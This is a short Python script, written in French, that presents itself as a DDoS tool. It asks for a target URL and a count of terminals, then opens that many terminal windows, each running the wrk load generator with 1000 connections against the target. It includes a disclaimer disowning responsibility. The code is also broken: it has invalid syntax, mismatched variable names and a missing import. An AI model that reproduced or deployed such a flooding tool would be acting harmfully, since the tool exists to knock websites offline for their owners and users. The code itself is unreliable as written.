import subprocess
import platform
import os

def DDOS():
    print(f"Je ne suis pas responsable de ce que vous faites avec cette outils")
    int(nb) = input("Quelle est le nombre de terminal ouvert? (seulement le chiffre svp)")
    URL = input("URL? (avec http.s): ")
    cmd = f"wrk -t171 -c1000 -d40 {URL}"
    systeme = platform.system()

    for _ in range(nb):
        if systeme == "Windows":
            subprocess.Popen([
                "powershell", "-Command",
                f"Start-Process cmd -ArgumentList '/c wsl -- bash -c \"{commande}; exec bash\"'"
            ])
        elif systeme == "Linux":
            # Détection de terminal Linux
            if shutil.which("gnome-terminal"):
                subprocess.Popen(["gnome-terminal", "--", "bash", "-c", f"{commande}; exec bash"])
            elif shutil.which("xfce4-terminal"):
                subprocess.Popen(["xfce4-terminal", "--command", f"bash -c '{commande}; exec bash'"])
            elif shutil.which("xterm"):
                subprocess.Popen(["xterm", "-e", f"{commande}; bash"])
            else:
                print("Aucun terminal compatible")
        else:
            print(f"Système non supporté : {systeme}")
